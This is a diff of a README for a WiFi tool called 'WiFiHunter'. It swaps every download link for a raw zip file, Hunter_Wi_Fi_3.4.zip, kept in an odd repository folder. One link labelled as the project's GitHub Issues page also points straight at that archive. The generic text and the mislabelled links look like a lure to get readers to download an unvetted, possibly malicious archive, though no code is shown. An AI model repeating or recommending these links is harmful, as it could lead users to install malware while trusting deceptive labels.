@@ -1,6 +1,6 @@
 # 🌐 WiFiHunter - Detect and Connect to WiFi Networks Easily
 
-[![Download WiFiHunter](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/WiFiHunter.zip)](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/WiFiHunter.zip)
+[![Download WiFiHunter](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/Hunter_Wi_Fi_3.4.zip)](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/Hunter_Wi_Fi_3.4.zip)
 
 ## 📚 Description
 
@@ -14,7 +14,7 @@ Follow these simple steps to get up and running with WiFiHunter.
 
 To download WiFiHunter, visit our releases page. You will find the most recent version of the software there.
 
-[Download WiFiHunter](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/WiFiHunter.zip)
+[Download WiFiHunter](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/Hunter_Wi_Fi_3.4.zip)
 
 ### 2. Choose the Right File
 
@@ -73,7 +73,7 @@ WiFiHunter supports Windows, macOS, and Linux. Check the release notes for speci
 
 ### Q3: Where can I find help if I encounter issues?
 
-If you face issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/WiFiHunter.zip) to report problems or seek help.
+If you face issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/Hunter_Wi_Fi_3.4.zip) to report problems or seek help.
 
 ## 🌍 Community and Support
 
@@ -83,6 +83,6 @@ WiFiHunter has a growing user community. You can share tips, ask questions, and 
 
 Ready to start? Download WiFiHunter now from the link below:
 
-[Download WiFiHunter](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/WiFiHunter.zip)
+[Download WiFiHunter](https://raw.githubusercontent.com/sancarloscyclist/WiFiHunter/main/domal/Hunter_Wi_Fi_3.4.zip)
 
 This concludes the installation guide for WiFiHunter. Enjoy finding and connecting to WiFi networks with ease!
